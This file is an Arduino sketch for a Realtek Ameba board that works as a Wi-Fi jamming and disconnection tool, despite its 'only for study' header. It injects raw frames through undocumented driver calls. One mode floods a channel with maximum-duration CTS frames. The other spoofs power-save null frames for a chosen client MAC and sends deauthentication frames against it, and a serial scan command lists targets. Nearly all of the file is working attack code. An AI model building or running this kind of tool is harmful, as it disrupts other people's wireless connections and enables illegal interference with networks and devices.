//ONLY FOR STUDY PURPOSE
// WARNING: version of AmebaSDK must be 3.1.7 for normal compile
//made by SoDaVk, please give me a star on github: https://github.com/SODAVK
#include <Arduino.h>
#include <wifi_conf.h>
#include <wifi_util.h>
#include <wifi_structures.h>
#include <freertos_pmu.h>
#define WLAN0_NAME "wlan0"

extern uint8_t* rltk_wlan_info;
extern "C" void* alloc_mgtxmitframe(void* ptr);
extern "C" void update_mgntframe_attrib(void* ptr, void* frame_control);
extern "C" int dump_mgntframe(void* ptr, void* frame_control);
enum AttackMode { MODE_OFF, MODE_CTS, MODE_SLEEP };
AttackMode current_mode = MODE_OFF;
static uint16_t global_seq = 0;
uint8_t target_mac[6];
uint8_t router_mac[6];

#pragma pack(push, 1)
struct CTSFrame {
    uint16_t frame_control = 0x00C4; 
    uint16_t duration = 0x7FFF; 
    uint8_t receiver_addr[6];   };
struct NullFrame {
    uint16_t frame_control = 0x0148; 
    uint16_t duration = 0x0000;
    uint8_t destination[6];          
    uint8_t source[6];               
    uint8_t bssid[6];                
    uint16_t sequence_number = 0;};
struct DeauthFrame {
    uint16_t frame_control = 0x00C0;
    uint16_t duration = 0x0100;
    uint8_t dst[6]; uint8_t src[6]; uint8_t bssid[6];
    uint16_t sequence_number = 0;
    uint16_t reason = 0x0100;};
#pragma pack(pop)

void sendRaw(void* frame, size_t len) {
    if (!rltk_wlan_info) return;
    uint8_t *ptr = (uint8_t *)**(uint32_t **)(rltk_wlan_info + 0x10);
    void *f_ctrl = alloc_mgtxmitframe(ptr + 0xae0);
    if (f_ctrl) {
        update_mgntframe_attrib(ptr, (void*)((uint8_t*)f_ctrl + 8));
        uint8_t *f_data = (uint8_t *)*(uint32_t *)((uint8_t*)f_ctrl + 0x80) + 0x28;
        memcpy(f_data, frame, len);
        *(uint32_t *)((uint8_t*)f_ctrl + 0x14) = len;
        *(uint32_t *)((uint8_t*)f_ctrl + 0x18) = len;
        dump_mgntframe(ptr, f_ctrl);}}

rtw_result_t scan_handler(rtw_scan_handler_result_t* res) {
    if (res->scan_complete == 0) {
        rtw_scan_result_t* ap = &res->ap_details;
        char b[18];
        sprintf(b, "%02X:%02X:%02X:%02X:%02X:%02X", ap->BSSID.octet[0], ap->BSSID.octet[1], ap->BSSID.octet[2], ap->BSSID.octet[3], ap->BSSID.octet[4], ap->BSSID.octet[5]);
        Serial.println(String((const char*)ap->SSID.val) + " | " + b + " | CH:" + String(ap->channel));}
    return RTW_SUCCESS;}

void parseMAC(String s, uint8_t* mac) {
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)strtol(s.substring(i * 2, i * 2 + 2).c_str(), NULL, 16);}

void setup() {
    Serial.begin(115200);
    wifi_on(RTW_MODE_STA);
    wifi_enable_powersave();
    pmu_set_sysactive_time(0);}

void loop() {
    if (current_mode == MODE_CTS) {
        CTSFrame cf;
        for(int i=0; i<6; i++) cf.receiver_addr[i] = random(0, 256);
        cf.receiver_addr[0] &= 0xFE; 
        for(int j=0; j<80; j++) sendRaw(&cf, sizeof(cf));} 
    else if (current_mode == MODE_SLEEP) {
        NullFrame nf;
        memcpy(nf.destination, router_mac, 6);
        memcpy(nf.source, target_mac, 6);
        memcpy(nf.bssid, router_mac, 6);
        for(int i=0; i<12; i++) {
            nf.sequence_number = (global_seq++) << 4;
            sendRaw(&nf, sizeof(nf));}
        if (global_seq % 30 == 0) {
            DeauthFrame df;
            memcpy(df.dst, target_mac, 6); memcpy(df.src, router_mac, 6); memcpy(df.bssid, router_mac, 6);
            df.sequence_number = (global_seq++) << 4;
            sendRaw(&df, sizeof(df));}
        delayMicroseconds(300);}

    if (Serial.available()) {
        String cmd = Serial.readStringUntil('\n'); cmd.trim();
        if (cmd == "scan") {
            pmu_set_sysactive_time(0xFFFFFFFF);
            wifi_scan_networks(scan_handler, NULL);
            delay(5000); pmu_set_sysactive_time(0);}
        else if (cmd.startsWith("cts ")) {
            //format: cts 1 (channel)
            wext_set_channel(WLAN0_NAME, cmd.substring(4).toInt());
            current_mode = MODE_CTS;
            wifi_disable_powersave(); pmu_set_sysactive_time(0xFFFFFFFF);
            Serial.println("cts on");}
        else if (cmd.startsWith("sleep ")) {
            //format:sleep 112233445566 AABBCCDDEEFF 6
            //sleep MAC/BSSIDrouter MAC/BSSIDclient channel
            parseMAC(cmd.substring(6, 18), router_mac);
            parseMAC(cmd.substring(19, 31), target_mac);
            wext_set_channel(WLAN0_NAME, cmd.substring(32).toInt());
            current_mode = MODE_SLEEP;
            wifi_disable_powersave(); pmu_set_sysactive_time(0xFFFFFFFF);
            Serial.println("sleep on");}
        else if (cmd == "stop") {
            current_mode = MODE_OFF;
            wifi_enable_powersave(); pmu_set_sysactive_time(0);
            Serial.println("off");}}}
